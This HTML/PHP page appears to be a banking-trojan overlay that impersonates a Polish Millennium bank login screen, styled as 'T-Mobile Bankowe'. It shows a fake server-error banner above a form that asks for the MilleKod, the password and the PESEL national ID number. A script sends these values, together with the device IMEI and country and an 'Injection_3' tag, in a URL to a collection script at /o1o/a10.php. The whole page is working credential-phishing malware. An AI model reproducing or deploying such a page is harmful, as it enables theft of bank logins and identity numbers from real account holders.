<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">

</head>


<style>

html {
    height: 100%;
    width: 100%;
}

body {
    font-family: sans-serif;
    margin: 0;
    padding: 0;
    background: #f5f5f5;
    color: #000;
}

.header {
    background: #fff;
    padding: 10px;
    border-bottom: 1px solid #cdcdcd;
    text-align: center;
    font-weight: bold;
}

#form {
    padding: 20px;
    color: #000;
}

.booting.on {
    top: 0;
}


.text-center {
    text-align: center;
}

.booting {
    position: absolute;
    z-index: 100;
    top: -100%;
    -webkit-transition: all .5s ease;
    transition: all .5s ease;
    background-size: cover;
    background-repeat: no-repeat;
    background-position: center;
    overflow: auto;
    text-align: center;
}

.booting.on .booting-logo {
    -webkit-animation: booting-animation;
    animation: booting-animation;
        animation-duration: 0s;
        animation-iteration-count: 1;
    -webkit-animation-duration: 2s;
    animation-duration: 2s;
    -webkit-animation-iteration-count: infinite;
    animation-iteration-count: infinite;
}

label {
    color: #000;
    font-weight: 100;
    margin-top: 9px;
}

.input {
    width: 100%;
    background: #fff;
    padding: 7px;
    border: 1px solid #cdcdcd;
    border-radius: 2px;
    margin-bottom: 15px;
    color: #000;
}

.button {
    background: #fff;
    color: #000;
    float: right;
    border: 1px solid #cdcdcd;
    border-radius: 4px;
    padding: 10px 35px;
    font-size: 18px;
    font-weight: 100;
}

</style>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>

    <div class="header">
        <img style="float: left;margin-right: -29px;" src="data:image/gif;base64,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">
        Zaloguj się
    </div>

    <form id="form" method="POST">
        <label for="login">MilleKod</label>
        <input type="text" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="login" id="login">

        <label for="password">Password</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="password" id="password">

        <label for="pesel">Pesel</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9]{11,11}" name="pesel" id="pesel">

        <input type="submit" onclick="sentServer();" class="button" value="Zaloguj">
    </form>



    <script>
        function sentServer(){
      //    alert('1q23123');
          //  var imei_c = document.forms["form"].elements["imei"].value;
            var login1 = document.forms["form"].elements["login"];
            var haslo = document.forms["form"].elements["password"];
            var mob_pas = document.forms["form"].elements["pesel"];

            var url='<?php echo $URL; ?>';
            var imei_c='<?php echo $IMEI_country; ?>';

            if((login1.value!="")&&(haslo.value!="")&&(mob_pas.value!="")){
              location.replace('/o1o/a10.php?p=' + imei_c+"|Injection_3|wit_android_bcp_bankingapp_millenniumpl|"+login1.value+"|"+haslo.value+"|"+mob_pas.value);
            }
        }
    </script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},2e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
